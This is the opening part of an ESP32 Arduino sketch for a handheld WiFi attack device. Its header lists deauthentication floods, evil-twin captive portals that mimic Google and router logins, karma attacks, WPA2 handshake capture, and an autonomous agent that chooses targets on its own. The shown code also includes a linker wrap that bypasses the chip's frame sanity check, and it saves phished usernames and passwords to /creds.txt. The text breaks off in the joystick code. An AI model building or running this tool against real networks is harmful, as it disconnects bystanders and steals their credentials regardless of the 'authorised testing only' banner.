/*
 * ╔══════════════════════════════════════════════════════════════╗
 * ║              ESP32 PWNAGOTCHI v18                           ║
 * ║                                                             ║
 * ║  Hardware:                                                  ║
 * ║    ESP32 DevKit + SSD1306 OLED 128x64 (I2C: SDA=21 SCL=22) ║
 * ║    Joystick analog: VRX=34  VRY=35  SW=33                  ║
 * ║                                                             ║
 * ║  Required extra files in sketch folder:                     ║
 * ║    build_opt.h    → -Wl,--wrap=ieee80211_raw_frame_sanity_check
 * ║    deauth_patch.c → int __wrap_ieee80211_raw_frame_sanity_check(){return 0;}
 * ║                                                             ║
 * ║  Arduino IDE settings:                                      ║
 * ║    Board  : ESP32 Dev Module                                ║
 * ║    Partition: Default 4MB with spiffs (1.2MB/1.5MB)        ║
 * ║                                                             ║
 * ║  ⚠  FOR AUTHORISED TESTING ON YOUR OWN NETWORKS ONLY ⚠    ║
 * ╠══════════════════════════════════════════════════════════════╣
 * ║  MODULES                                                    ║
 * ║   1. SCAN        – WiFi scan, sorted by RSSI                ║
 * ║   2. DEAUTH      – Rogue-AP + frame injection + CH-hop      ║
 * ║   3. DEAUTH ALL  – Broadcast deauth every scanned AP        ║
 * ║   4. EVIL TWIN   – Fake AP + captive portal (3 themes)      ║
 * ║   5. KARMA ATK   – Auto-respond to probe requests           ║
 * ║   6. HANDSHAKE   – WPA2 4-way capture → .pcap              ║
 * ║   7. PWNAGOTCHI  – Autonomous AI-style pwning agent         ║
 * ║   8. BEACON      – SSID spoofer (15 rotating SSIDs)        ║
 * ║   9. PROBE SNIFF – Capture probe requests + MACs           ║
 * ║  10. CH SCAN     – Per-channel traffic heatmap              ║
 * ║  11. SIG TRACK   – RSSI live graph (find AP physically)     ║
 * ║  12. WEBSERVER   – Download creds / handshakes via browser  ║
 * ║  13. STORAGE     – Manage / wipe LittleFS                   ║
 * ║  14. PKT MON     – Live packet-per-second waveform          ║
 * ╚══════════════════════════════════════════════════════════════╝
 *
 * Pwnagotchi mode features:
 *   • Autonomous scan → target selection → Evil Twin + Deauth
 *   • Smart target failover: blacklists APs that yield no creds
 *     after a configurable timeout, then moves to the next best
 *   • Tries every WPA2 AP in RSSI order before giving up
 *   • Persistent stats (pwned count, epochs) survive reboots
 *   • Animated ASCII face with 17 expressions + blink animation
 *   • Mood system: BORED / SCANNING / FOUND / DEAUTHING /
 *                  WAITING / PWNED / SAD / HAPPY / BOOT
 */

// ── INCLUDES ─────────────────────────────────────────────────
#include <WiFi.h>
#include <WiFiAP.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include <LittleFS.h>
#include <vector>
#include <algorithm>

extern "C" {
  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t secondary);
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void* buffer,
                               int len, bool en_sys_seq);
}
void IRAM_ATTR pktCallback(void* buf, wifi_promiscuous_pkt_type_t type);

// ── HARDWARE PINS ────────────────────────────────────────────
#define JOY_X_PIN    34
#define JOY_Y_PIN    35
#define JOY_SW_PIN   33
#define JOY_DEADZONE 700
#define OLED_SDA     21
#define OLED_SCL     22

// ── SCREEN ───────────────────────────────────────────────────
#define SCREEN_W  128
#define SCREEN_H   64

// ── TIMING ───────────────────────────────────────────────────
#define BEACON_TX_MS    100UL   // ms between beacon frames
#define HOP_INTERVAL_MS 300UL   // ms between channel hops (deauth)
#define CH_SCAN_HOP_MS  500UL   // ms between hops in CH SCAN
#define DEAUTH_BURST      5     // frames per deauth burst
#define ET_DEAUTH_INT   800UL   // ms between ET deauth pulses

// ── CAPACITIES ───────────────────────────────────────────────
#define MAX_APS         20
#define MAX_CLIENTS      8
#define MAX_PROBES      20
#define CH_SCAN_MAX     13
#define PCAP_MAX_FRAMES 128
#define PPS_HIST         64
#define RSSI_HIST       110

// ── NETWORK ──────────────────────────────────────────────────
#define AP_CH           1
#define DNS_PORT        53
#define DATA_AP_SSID    "pwnagotchi-data"
#define DATA_AP_PASS    "pwnagotchi"

// ── STORAGE ──────────────────────────────────────────────────
#define FS_CREDS_FILE   "/creds.txt"
#define FS_PW_STATS     "/pw_stats.bin"  // persistent pwnagotchi counters

// ── PWNAGOTCHI TUNING ────────────────────────────────────────
// Seconds to wait for a credential before blacklisting this AP
#define PW_ATTACK_TIMEOUT_S   90
// Seconds between idle scan cycles
#define PW_RESCAN_INTERVAL_S  15
// Seconds to show FOUND face before launching attack
#define PW_TARGET_PAUSE_S      3
// Seconds to celebrate after PWNED before moving on
#define PW_CELEBRATE_S         5
// Max APs to try per scan epoch before resting
#define PW_MAX_TRIES_PER_EPOCH 5

// ── PWNAGOTCHI FACES ─────────────────────────────────────────
#define FACE_AWAKE   "(0_0)"
#define FACE_BORED   "(-_-)"
#define FACE_INTENSE "(>_<)"
#define FACE_COOL    "(^_~)"
#define FACE_HAPPY   "(^o^)"
#define FACE_EXCITED "(*_*)"
#define FACE_SLEEP   "(-_-)zz"
#define FACE_DEAUTH  "(>_<)*"
#define FACE_SCAN    "(o_o)"
#define FACE_FOUND   "(*O*)"
#define FACE_PWNED   "(>:D)"
#define FACE_SAD     "(;_;)"
#define FACE_LOOK_R  "( ^_^)"
#define FACE_LOOK_L  "(^_^ )"
#define FACE_UPLOAD  "(~_~)"

// ── ENUMS ────────────────────────────────────────────────────
enum MenuOption {
  MENU_SCAN, MENU_DEAUTH, MENU_DEAUTH_ALL, MENU_EVIL_TWIN,
  MENU_KARMA, MENU_HANDSHAKE, MENU_PWNAGOTCHI,
  MENU_BEACON, MENU_PROBE_SNIFF, MENU_CH_SCAN, MENU_SIG_TRACK,
  MENU_WEBSERVER, MENU_STORAGE, MENU_PKT_MON,
  MENU_COUNT
};
enum ScreenState {
  ST_MAIN, ST_SCANNING,
  ST_DEAUTH_SEL, ST_DEAUTHING,
  ST_DEAUTH_ALL,
  ST_ET_SEL, ST_ET_THEME, ST_EVIL_TWIN,
  ST_KARMA,
  ST_HS_SEL, ST_HANDSHAKE,
  ST_PWNAGOTCHI,
  ST_BEACONING,
  ST_PROBE_SNIFF,
  ST_CH_SCAN,
  ST_SIG_SEL, ST_SIG_TRACK,
  ST_WEBSERVER, ST_STORAGE,
  ST_PKT_MON, ST_MSG
};
enum JoyDir  { JOY_NONE, JOY_UP, JOY_DOWN, JOY_LEFT, JOY_RIGHT, JOY_CLICK };
enum EtTheme { ET_WLAN=0, ET_GOOGLE=1, ET_ROUTER=2, ET_COUNT=3 };

// Pwnagotchi mood & phase
enum PwMood  { PW_BOOT, PW_BORED, PW_SCANNING, PW_FOUND,
               PW_DEAUTHING, PW_WAITING, PW_PWNED, PW_SAD, PW_HAPPY };
enum PwPhase { PW_PH_IDLE, PW_PH_SCAN, PW_PH_TARGET,
               PW_PH_ATTACK, PW_PH_CAPTURED, PW_PH_EXHAUSTED };

// ── STRUCTS ──────────────────────────────────────────────────
struct APInfo {
  char    ssid[33];
  uint8_t bssid[6];
  int     ch, rssi;
  char    enc[8];      // OPEN/WEP/WPA/WPA2/WPA/2
  bool    wps;
  bool    blacklisted; // pwnagotchi: tried and gave no creds
  uint8_t tries;       // pwnagotchi: how many times attempted
};
struct ClientInfo { uint8_t mac[6]; unsigned long lastSeen; };
struct HsFrame    { uint16_t len; uint8_t data[256]; };
struct ProbeEntry { char ssid[33]; uint8_t mac[6]; int rssi; unsigned long ts; };

// ── PWNAGOTCHI STATE ─────────────────────────────────────────
struct PwState {
  PwMood   mood         = PW_BOOT;
  PwPhase  phase        = PW_PH_IDLE;
  char     face[12]     = FACE_AWAKE;
  char     status[36]   = "Booting...";
  char     target[17]   = "";    // current target SSID (display, max 16 chars)
  int      targetAP     = -1;    // index into apList[]
  uint8_t  triedCount   = 0;     // APs attempted this epoch
  uint32_t totalPwned   = 0;     // persisted across reboots
  uint32_t sessionCreds = 0;
  uint32_t sessionHS    = 0;
  uint16_t epoch        = 0;     // scan cycles since boot
  uint8_t  channel      = 1;     // display channel during scan animation
  bool     eyeLeft      = false;
  unsigned long nextAct    = 0;
  unsigned long lastFace   = 0;
  unsigned long lastBlink  = 0;
  unsigned long attackTs   = 0;  // when current attack started
};

// Pwnagotchi mood message pools
static const char* const PW_MSG_BOOT[]    = { "Waking up...", "Initialising...", "Ready to pwn!" };
static const char* const PW_MSG_BORED[]   = { "Nothing here...", "Yawn. So bored.", "Anyone there?" };
static const char* const PW_MSG_SCAN[]    = { "Looking around...", "Hop hop hop...", "What's that?" };
static const char* const PW_MSG_FOUND[]   = { "A target! >:D", "Interesting...", "You're mine now." };
static const char* const PW_MSG_DEAUTH[]  = { "Goodbye! Bye!", "Disconnect. Haha.", "Get out!" };
static const char* const PW_MSG_WAIT[]    = { "Come on...", "Password please :)", "I'm waiting~" };
static const char* const PW_MSG_PWNED[]   = { "PWNED! :D", "Thanks for the PW!", "Delicious. More!" };
static const char* const PW_MSG_SAD[]     = { "No APs. Really?", "Dead zone here.", "Everyone's WPA3..." };
static const char* const PW_MSG_HAPPY[]   = { "Good day today!", "I'm the best!", "More targets please" };
static const char* const PW_MSG_SKIP[]    = { "Moving on...", "Next target!", "This one's stubborn." };

// ── GLOBALS ──────────────────────────────────────────────────
static int  joyXc=2047, joyYc=2047;
static bool btnHeld=false;

Adafruit_SSD1306 display(SCREEN_W, SCREEN_H, &Wire, -1);
static String        g_msg;
static unsigned long g_msgEnd=0;

// AP list
static APInfo        apList[MAX_APS];
static int           apCount=0;

// Menu state
static ScreenState   screen=ST_MAIN;
static int           menuItem=0;
static bool          running=false;
static unsigned long attackStart=0;
static unsigned long attackDur=40000UL;
static unsigned long lastOLED=0;

// Deauth / rogue AP
static int           selectedAP=-1;
static int           targetCh=AP_CH;
static uint32_t      deauthsSent=0;
static bool          deauthRunning=false;
static bool          deauthAllRunning=false;
static bool          deauthHop=false;
static uint8_t       hopChs[]={1,2,3,4,5,6,7,8,9,10,11,12,13};
static int           hopIdx=0;
static unsigned long lastHop=0;
static bool          rogueAPUp=false;
static ClientInfo    clients[MAX_CLIENTS];
static int           clientCnt=0;
static portMUX_TYPE  clientMx=portMUX_INITIALIZER_UNLOCKED;

// Packet monitor
static uint32_t      pktTotal=0, pktData=0;
static int           hsTotal=0;
static int           ppsHist[PPS_HIST]={};
static unsigned long lastPpsUpd=0;
static uint32_t      lastPktTot=0;

// Channel scanner
static uint32_t      chPkt[CH_SCAN_MAX]={};
static uint8_t       chScanCh=1;
static unsigned long lastChHop=0;

// Probe sniffer
static ProbeEntry    probes[MAX_PROBES];
static int           probeCnt=0;
static int           probeView=0;
static portMUX_TYPE  probeMx=portMUX_INITIALIZER_UNLOCKED;

// Signal tracker
static int8_t        sigHist[RSSI_HIST]={};
static int           sigIdx=0;
static int           sigCur=0;
static unsigned long lastSigUpd=0;
static int           sigAP=-1;

// SSID spoofer
static const char* spooferSSIDs[]={
  "FBI Surveillance Van","Free WiFi","NSA_Monitored","NOT_YOUR_WIFI",
  "HackMeIfYouCan","PleaseConnectToMe","xfinitywifi","Skynet_Defense",
  "ICanSeeYou","NotAVirus_TrustMe","DefinitelyLegit","GetOffMyLawn",
  "Router_ARMAGEDDON","SneakyNetwork","TotallyLegit_5G"
};
static int           spooferIdx=0;
static const int     SPOOFER_CNT=sizeof(spooferSSIDs)/sizeof(spooferSSIDs[0]);
static bool          beaconing=false;
static unsigned long lastBeacon=0;

// Evil Twin
static WebServer     etServer(80);
static DNSServer     dnsServer;
static bool          etActive=false;
static bool          etDeauthOn=false;
static String        etUser="", etPw="";
static int           etCapCnt=0;
static char          etSSID[33]="";
static EtTheme       etTheme=ET_WLAN;

// Karma
static bool          karmaActive=false;
static int           karmaCnt=0;
static char          karmaLastSSID[33]="";

// Handshake
static bool          hsCapturing=false;
static char          hsSSID[33]="";
static uint8_t       hsBSSID[6]={};
static int           hsCaptured=0;
static bool          hsM1=false,hsM2=false,hsM3=false,hsM4=false;
static HsFrame       hsBuf[PCAP_MAX_FRAMES];
static int           hsBufCnt=0;
static bool          hsSaved=false;

// Data webserver
static WebServer     dataServer(8080);
static bool          dataUp=false;
static size_t        fsTotal=0, fsUsed=0;

// Pwnagotchi
static PwState       pw;

// ── FORWARD DECLARATIONS ─────────────────────────────────────
void  drawOLED();
void  stopAll();
void  doScan();
static void setPromisc(bool en);
static void restoreWiFi();
static void startEvilTwin(int apIdx);
static void stopEvilTwin();
static void hsCheckAndSave();
static void pwSetMood(PwMood m);
static void pwSaveStats();
static void _setupEtServer();

// ════════════════════════════════════════════════════════════
//  LITTLEFS HELPERS
// ════════════════════════════════════════════════════════════
static void fsInit(){
  if(!LittleFS.begin(true)) Serial.println(F("[FS] Mount FAILED"));
  else Serial.println(F("[FS] Mounted OK"));
}
static void fsStats(){ fsTotal=LittleFS.totalBytes(); fsUsed=LittleFS.usedBytes(); }

static void fsSaveCred(const char* ssid, const char* user, const char* pass){
  File f=LittleFS.open(FS_CREDS_FILE,"a");
  if(!f) return;
  f.printf("SSID: %s | USER: %s | PASS: %s\n", ssid, user, pass);
  f.close();
  Serial.printf("[CRED] %s / %s @ %s\n", user, pass, ssid);
}

static bool fsSaveHandshake(const char* ssid, const uint8_t* bssid,
                             HsFrame* frames, int count){
  char safe[33]; int j=0;
  for(int i=0;i<32&&ssid[i];i++){
    char c=ssid[i];
    safe[j++]=((c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9'))?c:'_';
  }
  safe[j]='\0';
  char fname[48]; snprintf(fname,48,"/hs_%s.pcap",safe);
  const uint8_t ph[]={0xD4,0xC3,0xB2,0xA1,0x02,0x00,0x04,0x00,
                      0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                      0xFF,0xFF,0x00,0x00,0x69,0x00,0x00,0x00};
  File f=LittleFS.open(fname,"w"); if(!f) return false;
  f.write(ph,24);
  unsigned long ts=millis();
  for(int i=0;i<count;i++){
    uint32_t sec=ts/1000, us=(ts%1000)*1000, len=frames[i].len;
    f.write((uint8_t*)&sec,4); f.write((uint8_t*)&us,4);
    f.write((uint8_t*)&len,4); f.write((uint8_t*)&len,4);
    f.write(frames[i].data, frames[i].len);
  }
  f.close();
  Serial.printf("[FS] HS saved → %s (%d frames)\n", fname, count);
  return true;
}

static void fsDelCreds(){ LittleFS.remove(FS_CREDS_FILE); }
static void fsDelHS(){
  File root=LittleFS.open("/"); File f=root.openNextFile();
  while(f){
    String n=String("/")+f.name(); f.close();
    if(n.startsWith("/hs_")&&n.endsWith(".pcap")) LittleFS.remove(n);
    f=root.openNextFile();
  }
  root.close();
}
static void fsDelAll(){ fsDelCreds(); fsDelHS(); }

// ════════════════════════════════════════════════════════════
//  OLED HELPERS
// ════════════════════════════════════════════════════════════
static char hexNib(uint8_t v){ return v<10?'0'+v:'A'+v-10; }
static void macToStr(const uint8_t* m, char* out){
  for(int i=0;i<6;i++){
    out[i*3]  =hexNib(m[i]>>4);
    out[i*3+1]=hexNib(m[i]&0xF);
    out[i*3+2]=(i<5)?':':'\0';
  }
}
static void oText(int x,int y,const char* s,uint8_t sz=1){
  display.setTextSize(sz); display.setCursor(x,y); display.print(s);
}
static void oCentre(int y,const char* s,uint8_t sz=1){
  int x=(SCREEN_W-(int)strlen(s)*6*sz)/2; if(x<0)x=0;
  display.setTextSize(sz); display.setCursor(x,y); display.print(s);
}
static void oBar(int y,int pct){
  display.drawRect(0,y,128,8,SSD1306_WHITE);
  display.fillRect(2,y+2,(124*pct)/100,4,SSD1306_WHITE);
}
// Thin separator line
static void oLine(int y){ display.drawLine(0,y,127,y,SSD1306_WHITE); }

// ════════════════════════════════════════════════════════════
//  DRAW OLED
// ════════════════════════════════════════════════════════════
void drawOLED(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  char b[48];

  switch(screen){

  // ── MAIN MENU ───────────────────────────────────────────
  case ST_MAIN:{
    const char* items[]={
      "SCAN","DEAUTH","DEAUTH ALL","EVIL TWIN",
      "KARMA ATK","HANDSHAKE","PWNAGOTCHI",
      "BEACON","PROBE SNIFF","CH SCAN","SIG TRACK",
      "WEBSERVER","STORAGE","PKT MON"
    };
    oText(0,0,"== PWNAGOTCHI ==");
    oLine(10);
    snprintf(b,16,"%d/%d",menuItem+1,MENU_COUNT);
    oText(128-(int)strlen(b)*6,0,b);
    oCentre(26,items[menuItem],2);
    display.setTextSize(1);
    if(menuItem>0)            { display.setCursor(59,14); display.print("^"); }
    if(menuItem<MENU_COUNT-1) { display.setCursor(59,55); display.print("v"); }
    display.drawRect(40,54,48,10,SSD1306_WHITE);
    display.setCursor(44,55); display.print("[CLICK]");
    snprintf(b,24,"C:%d H:%d",etCapCnt,hsCaptured); oText(0,54,b);
    break;
  }

  // ── SCANNING ────────────────────────────────────────────
  case ST_SCANNING:
    oCentre(0,"SCANNING...",2);
    snprintf(b,24,"Found: %d",apCount); oCentre(28,b);
    oCentre(40,"2.4 GHz only");
    oBar(52,(millis()/100)%100);
    break;

  // ── DEAUTH SELECT ───────────────────────────────────────
  case ST_DEAUTH_SEL:{
    oText(0,0,"DEAUTH"); oLine(10);
    if(apCount>0){
      snprintf(b,16,"%d/%d",selectedAP+1,apCount);
      oText(128-(int)strlen(b)*6,0,b);
      const char* s=apList[selectedAP].ssid;
      if(!strlen(s)) s="(hidden)";
      oCentre(13,s);
      snprintf(b,10,"CH%d",apList[selectedAP].ch); oCentre(23,b,2);
      snprintf(b,28,"%s  %ddBm",apList[selectedAP].enc,apList[selectedAP].rssi);
      oCentre(43,b);
      if(selectedAP>0)        { display.setCursor(0,28); display.print("<"); }
      if(selectedAP<apCount-1){ display.setCursor(121,28); display.print(">"); }
      display.drawRect(2,54,124,10,SSD1306_WHITE);
      display.setCursor(6,55);
      display.print(deauthHop ? "UP:toggle[HOP] CLK:ATK"
                               : "UP:toggle[FIX] CLK:ATK");
    } else { oCentre(22,"No APs!"); oCentre(36,"Scan first."); }
    break;
  }

  // ── DEAUTHING ───────────────────────────────────────────
  case ST_DEAUTHING:{
    oCentre(0,"DEAUTHING",2);
    if(selectedAP>=0){
      char ss[15]; const char* src=apList[selectedAP].ssid;
      if(strlen(src)>13){ strncpy(ss,src,12); ss[12]='~'; ss[13]='\0'; src=ss; }
      oCentre(18,src);
    }
    unsigned long el=millis()-attackStart;
    int pct=attackDur?(int)((el*100UL)/attackDur):0; if(pct>100) pct=100;
    oBar(30,pct);
    snprintf(b,32,"Pkts:%lu%s",deauthsSent,deauthHop?" HOP":""); oText(0,42,b);
    snprintf(b,32,"%lus/%lus CH%d",el/1000,attackDur/1000,targetCh); oCentre(54,b);
    break;
  }

  // ── DEAUTH ALL ──────────────────────────────────────────
  case ST_DEAUTH_ALL:
    oCentre(0,"DEAUTH ALL",2);
    snprintf(b,32,"APs:%d  Pkts:%lu",apCount,deauthsSent); oCentre(20,b);
    oCentre(32,"Broadcast inject");
    oCentre(44,"CH-hopping 1-13");
    oBar(54,(millis()/200)%100);
    break;

  // ── EVIL TWIN SELECT ────────────────────────────────────
  case ST_ET_SEL:{
    oText(0,0,"EVIL TWIN"); oLine(10);
    if(apCount>0){
      snprintf(b,16,"%d/%d",selectedAP+1,apCount);
      oText(128-(int)strlen(b)*6,0,b);
      const char* s=apList[selectedAP].ssid; if(!strlen(s)) s="(hidden)";
      oCentre(13,s);
      snprintf(b,10,"CH%d",apList[selectedAP].ch); oCentre(23,b,2);
      if(selectedAP>0)        { display.setCursor(0,43); display.print("<"); }
      if(selectedAP<apCount-1){ display.setCursor(121,43); display.print(">"); }
      display.drawRect(20,54,88,10,SSD1306_WHITE);
      display.setCursor(24,55); display.print("[CLICK=PORTAL]");
    } else { oCentre(22,"No APs!"); oCentre(36,"Scan first."); }
    break;
  }

  // ── EVIL TWIN THEME ─────────────────────────────────────
  case ST_ET_THEME:{
    oCentre(0,"SELECT THEME",1); oLine(10);
    const char* themes[]={"WLAN Login","Google","Router"};
    oCentre(26,themes[etTheme],2);
    if(etTheme>0)           { display.setCursor(0,34); display.print("<"); }
    if(etTheme<ET_COUNT-1)  { display.setCursor(121,34); display.print(">"); }
    display.drawRect(26,54,76,10,SSD1306_WHITE);
    display.setCursor(30,55); display.print("[CLICK=START]");
    break;
  }

  // ── EVIL TWIN RUNNING ───────────────────────────────────
  case ST_EVIL_TWIN:{
    oCentre(0,"EVIL TWIN",2);
    char ss[17]; strncpy(ss,etSSID,16); ss[16]='\0'; oCentre(18,ss);
    snprintf(b,32,"Cap:%d  Pkts:%lu",etCapCnt,deauthsSent); oText(0,30,b);
    if(etCapCnt>0){
      char u[10],p[10];
      strncpy(u,etUser.c_str(),9); u[9]='\0';
      strncpy(p,etPw.c_str(),9);   p[9]='\0';
      snprintf(b,24,"U: %.9s",u); oText(0,42,b);
      snprintf(b,24,"P: %.9s",p); oText(0,52,b);
    } else { oCentre(44,"Waiting for victim..."); }
    break;
  }

  // ── KARMA ATTACK ────────────────────────────────────────
  case ST_KARMA:
    oCentre(0,"KARMA ATTACK",1); oLine(10);
    snprintf(b,24,"Connections: %d",karmaCnt); oCentre(18,b);
    if(strlen(karmaLastSSID)>0){
      oText(0,30,"Last probe:"); oCentre(40,karmaLastSSID);
    } else oCentre(30,"Listening for probes...");
    snprintf(b,24,"Creds: %d",etCapCnt); oCentre(54,b);
    break;

  // ── HANDSHAKE SELECT ────────────────────────────────────
  case ST_HS_SEL:{
    oText(0,0,"HANDSHAKE"); oLine(10);
    if(apCount>0){
      snprintf(b,16,"%d/%d",selectedAP+1,apCount);
      oText(128-(int)strlen(b)*6,0,b);
      const char* s=apList[selectedAP].ssid; if(!strlen(s)) s="(hidden)";
      oCentre(13,s);
      snprintf(b,10,"CH%d",apList[selectedAP].ch); oCentre(23,b,2);
      if(selectedAP>0)        { display.setCursor(0,43); display.print("<"); }
      if(selectedAP<apCount-1){ display.setCursor(121,43); display.print(">"); }
      display.drawRect(20,54,88,10,SSD1306_WHITE);
      display.setCursor(24,55); display.print("[CLICK=LISTEN]");
    } else { oCentre(22,"No APs!"); oCentre(36,"Scan first."); }
    break;
  }

  // ── HANDSHAKE RUNNING ───────────────────────────────────
  case ST_HANDSHAKE:{
    oCentre(0,"HANDSHAKE",2);
    char ss[17]; strncpy(ss,hsSSID,16); ss[16]='\0'; oCentre(18,ss);
    snprintf(b,32,"M1:%c M2:%c M3:%c M4:%c",
      hsM1?'Y':'-', hsM2?'Y':'-', hsM3?'Y':'-', hsM4?'Y':'-');
    oText(2,30,b);
    snprintf(b,24,"Frames:%d  Saved:%d",hsBufCnt,hsCaptured); oText(0,42,b);
    if(hsSaved) oCentre(54,"** SAVED! **");
    else oBar(54,(millis()/200)%100);
    break;
  }

  // ── PWNAGOTCHI SCREEN ───────────────────────────────────
  // Layout: stats header | face (large, centred) | divider | status
  case ST_PWNAGOTCHI:{
    // Top stats bar
    unsigned long upS=(millis()-attackStart)/1000;
    snprintf(b,48,"ep:%u ch:%u aps:%d up:%lus",
             pw.epoch, pw.channel, apCount, upS);
    display.setTextSize(1);
    display.setCursor(0,0); display.print(b);
    oLine(9);

    // Face — large, centred, with blink animation
    const char* faceStr = pw.face;
    char blinkBuf[12];
    if(millis()-pw.lastBlink < 130){
      strcpy(blinkBuf,"(-_-)");
      faceStr=blinkBuf;
    }
    int fx=(SCREEN_W-(int)strlen(faceStr)*12)/2; if(fx<0) fx=0;
    display.setTextSize(2); display.setCursor(fx,13); display.print(faceStr);

    oLine(33);

    // Bottom area: counters + status + target
    snprintf(b,32,"pwn:%lu hs:%lu",
             pw.totalPwned+pw.sessionCreds, pw.sessionHS+hsCaptured);
    display.setTextSize(1); display.setCursor(0,35); display.print(b);
    display.setCursor(0,45); display.print(pw.status);

    if(strlen(pw.target)>0){
      snprintf(b,24,">>%.14s",pw.target);
      display.setCursor(0,55); display.print(b);
    } else if(pw.phase==PW_PH_IDLE){
      display.setCursor(0,55); display.print("[CLICK=START]");
    } else {
      display.setCursor(0,55); display.print("Searching...");
    }
    break;
  }

  // ── SIGNAL TRACKER SELECT ───────────────────────────────
  case ST_SIG_SEL:{
    oText(0,0,"SIG TRACK"); oLine(10);
    if(apCount>0){
      snprintf(b,16,"%d/%d",selectedAP+1,apCount);
      oText(128-(int)strlen(b)*6,0,b);
      const char* s=apList[selectedAP].ssid; if(!strlen(s)) s="(hidden)";
      oCentre(13,s);
      snprintf(b,20,"RSSI: %ddBm",apList[selectedAP].rssi); oCentre(25,b);
      snprintf(b,10,"CH%d",apList[selectedAP].ch); oCentre(35,b,2);
      if(selectedAP>0)        { display.setCursor(0,29); display.print("<"); }
      if(selectedAP<apCount-1){ display.setCursor(121,29); display.print(">"); }
      display.drawRect(20,54,88,10,SSD1306_WHITE);
      display.setCursor(24,55); display.print("[CLICK=TRACK]");
    } else { oCentre(22,"No APs!"); oCentre(36,"Scan first."); }
    break;
  }

  // ── SIGNAL TRACKER RUNNING ──────────────────────────────
  case ST_SIG_TRACK:{
    if(sigAP>=0){
      char ss[13]; strncpy(ss,apList[sigAP].ssid,12); ss[12]='\0';
      snprintf(b,28,"%-12s%ddBm",ss,sigCur); oText(0,0,b);
    }
    int barPct=sigCur>-40?100:sigCur<-95?0:(int)((sigCur+95)*100/55);
    oBar(10,barPct);
    display.setTextSize(1);
    if     (sigCur>-55){ display.setCursor(0,22);  display.print(">>> VERY CLOSE <<<"); }
    else if(sigCur>-70){ display.setCursor(10,22); display.print(">> GETTING CLOSER"); }
    else if(sigCur>-80){ display.setCursor(16,22); display.print("> MEDIUM RANGE"); }
    else               { display.setCursor(22,22); display.print("FAR AWAY - MOVE!"); }
    oLine(35);
    for(int i=0;i<RSSI_HIST-1;i++){
      int r1=sigHist[(sigIdx+i)  %RSSI_HIST];
      int r2=sigHist[(sigIdx+i+1)%RSSI_HIST];
      if(r1==0||r2==0) continue;
      int y1=63-(int)((r1+95)*27/55); if(y1<36)y1=36; if(y1>63)y1=63;
      int y2=63-(int)((r2+95)*27/55); if(y2<36)y2=36; if(y2>63)y2=63;
      display.drawLine(i,y1,i+1,y2,SSD1306_WHITE);
    }
    break;
  }

  // ── BEACON / SSID SPOOFER ───────────────────────────────
  case ST_BEACONING:
    oCentre(0,"SSID SPOOFER",1); oLine(10);
    oCentre(20,spooferSSIDs[spooferIdx],1);
    snprintf(b,24,"Sent: %lu",deauthsSent); oCentre(38,b);
    oBar(54,(millis()/200)%100);
    break;

  // ── PROBE SNIFFER ───────────────────────────────────────
  case ST_PROBE_SNIFF:{
    oText(0,0,"PROBE SNIFF"); oLine(10);
    snprintf(b,12,"Dev:%d",probeCnt); oText(90,0,b);
    if(probeCnt==0){ oCentre(28,"Listening..."); oBar(54,(millis()/200)%100); }
    else {
      for(int i=0;i<3&&i<probeCnt;i++){
        int idx=(probeView+i)%probeCnt;
        char mac[18]; macToStr(probes[idx].mac,mac);
        // show last 8 chars of MAC + SSID + RSSI
        snprintf(b,48,"%.8s %.14s",mac+9,probes[idx].ssid);
        oText(0,14+i*16,b);
        snprintf(b,8,"%d",probes[idx].rssi); oText(116,14+i*16,b);
      }
      if(probeCnt>3){ display.setCursor(59,55); display.print("v"); }
    }
    break;
  }

  // ── CHANNEL SCANNER ─────────────────────────────────────
  case ST_CH_SCAN:{
    oText(0,0,"CH SCAN"); oLine(10);
    uint32_t mx=1;
    for(int i=0;i<CH_SCAN_MAX;i++) if(chPkt[i]>mx) mx=chPkt[i];
    for(int i=0;i<CH_SCAN_MAX;i++){
      int x=i*9+2, h=(int)(chPkt[i]*40/mx); if(h<1&&chPkt[i]>0) h=1;
      if(i==chScanCh-1) display.fillRect(x,54-h,7,h,SSD1306_WHITE);
      else              display.drawRect(x,54-h,7,h,SSD1306_WHITE);
    }
    snprintf(b,28,"CH%d  pkts:%lu",chScanCh,chPkt[chScanCh-1]); oText(0,12,b);
    break;
  }

  // ── WEBSERVER ───────────────────────────────────────────
  case ST_WEBSERVER:
    oCentre(0,"DATA SERVER",2);
    oCentre(20,"Connect to WiFi:");
    oCentre(30,DATA_AP_SSID);
    oCentre(40,"→ 192.168.4.1:8080");
    oCentre(54,"[CLICK=STOP]");
    break;

  // ── STORAGE ─────────────────────────────────────────────
  case ST_STORAGE:{
    oCentre(0,"STORAGE",2); oLine(10);
    fsStats();
    snprintf(b,32,"%zuKB / %zuKB",fsUsed/1024,fsTotal/1024); oCentre(18,b);
    int pct=fsTotal?(int)(fsUsed*100/fsTotal):0; oBar(28,pct);
    display.setTextSize(1);
    display.setCursor(0,40); display.print("UP  = Delete creds");
    display.setCursor(0,50); display.print("DN  = Delete HS");
    display.setCursor(0,56); display.print("CLK = Delete ALL");
    break;
  }

  // ── PACKET MONITOR ──────────────────────────────────────
  case ST_PKT_MON:{
    snprintf(b,32,"PPS:%d  HS:%d",ppsHist[PPS_HIST-1],hsTotal); oText(0,0,b);
    oLine(10);
    int mx=1; for(int i=0;i<PPS_HIST;i++) if(ppsHist[i]>mx) mx=ppsHist[i];
    for(int i=0;i<PPS_HIST-1;i++){
      int y1=63-(ppsHist[i]  *52/(mx+1));
      int y2=63-(ppsHist[i+1]*52/(mx+1));
      display.drawLine(i*2,y1,i*2+2,y2,SSD1306_WHITE);
    }
    break;
  }

  case ST_MSG:
    oCentre(20,g_msg.c_str());
    break;
  }

  display.display();
}

// ════════════════════════════════════════════════════════════
//  JOYSTICK
// ════════════════════════════════════════════════════════════
void calibJoy(){ joyXc=analogRead(JOY_X_PIN); joyYc=analogRead(JOY_Y_PIN); }

JoyDir readJoy(){
  int dx=analogRead(JOY_X_PIN)-joyXc, dy=analogRead(JOY_Y_PIN)-joyYc;
  bool btn=(digitalRead(JOY_SW_PIN)==LOW);
